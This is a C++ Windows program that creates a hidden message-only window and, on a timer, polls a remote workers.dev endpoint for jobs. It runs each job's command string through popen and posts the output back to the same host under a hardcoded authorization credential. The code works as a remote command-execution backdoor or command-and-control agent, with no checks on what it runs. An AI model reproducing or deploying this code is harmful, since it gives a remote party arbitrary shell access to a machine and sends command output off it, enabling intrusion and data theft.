#include <iostream>
#include <string>
#include <curl/curl.h>
#include <rapidjson/document.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <array>
#include <windows.h>
//#include <thread>
//#include <chrono>

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}
struct Result {
    int exitcode;
    std::string output;
};
int SendResultsToWorker(int jobId, Result res){
    std::cout << "Job ID: "+std::to_string(jobId) << std::endl;
    std::cout << "exit code: "+std::to_string(res.exitcode) << std::endl;
    std::cout << "output: "+res.output << std::endl;
    CURL *curl;
    CURLcode curlRes;
    curl = curl_easy_init();
    if(curl) {
      curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_easy_setopt(curl, CURLOPT_URL, "https://cleopatra.etcetra7n.workers.dev/api/send-results-to-worker");
      curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
      curl_easy_setopt(curl, CURLOPT_DEFAULT_PROTOCOL, "https");
      struct curl_slist *headers = NULL;
      headers = curl_slist_append(headers, "Authorization:Taurus:ThisIsTaurusPassword");
      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
      std::string body = "{\"jobId\":" + std::to_string(jobId) +
                       ",\"output\":\"" + res.output +
                       "\",\"exitCode\":" + std::to_string(res.exitcode) + "}";
      std::string rawbody;
      for (char c : body) {
        if (c == '\n') 
          rawbody += "\\n";
        else 
          rawbody += c;
      }
      //std::cout << rawbody << std::endl;
      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, rawbody.c_str());
      curlRes = curl_easy_perform(curl);
      curl_slist_free_all(headers);
    }
    curl_easy_cleanup(curl);
    return 0;
}
Result exec(const char* cmd) {
    Result res;
    std::array<char, 128> buffer;
    //std::cout << "Before running cmd" << std::endl;
    FILE *pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (!feof(pipe)) {
        if (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
            res.output += buffer.data();
    }

    res.exitcode = pclose(pipe);
    //std::cout << "After running cmd" << std::endl;
    std::cout << "\n" << std::endl;
    return res;
}

//void CronJob(){
void CALLBACK CronJob(HWND, UINT, UINT_PTR, DWORD){
  CURL *curl;
  CURLcode curlRes;
  std::string readBuffer;

  curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(curl, CURLOPT_URL, "https://cleopatra.etcetra7n.workers.dev/api/fetch-daemon-job");
    curl_easy_setopt(curl, CURLOPT_DEFAULT_PROTOCOL, "https");
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Authorization:Taurus:ThisIsTaurusPassword");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
    curlRes = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    std::cout <<"job recieved: "<< readBuffer<< "\n" << std::endl;
    
    rapidjson::StringStream json_stream(readBuffer.c_str());
    rapidjson::Document result; 
    result.ParseStream(json_stream);
    const rapidjson::Value& jobs = result["body"];
    for (rapidjson::SizeType i = 0; i < jobs.Size(); i++){
        std::string command = jobs[i]["command"].GetString();
        Result res = exec(command.c_str());
        SendResultsToWorker(jobs[i]["JOB_ID"].GetInt(), res);
    }
  }
}

int main(void)
{
    HWND hwnd = CreateWindowEx(0, "STATIC", NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);
    
    UINT_PTR timerId = SetTimer(hwnd, 1, 20000, CronJob); //60 seconds
    if (!timerId) {
        std::cerr << "Failed to create timer.\n";
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    KillTimer(hwnd, timerId);
    /*
    while (true) {
        CronJob();  // Call the function
        std::this_thread::sleep_for(std::chrono::seconds(30)); // Sleep for 1 minute
    }
    */
    return 0;
}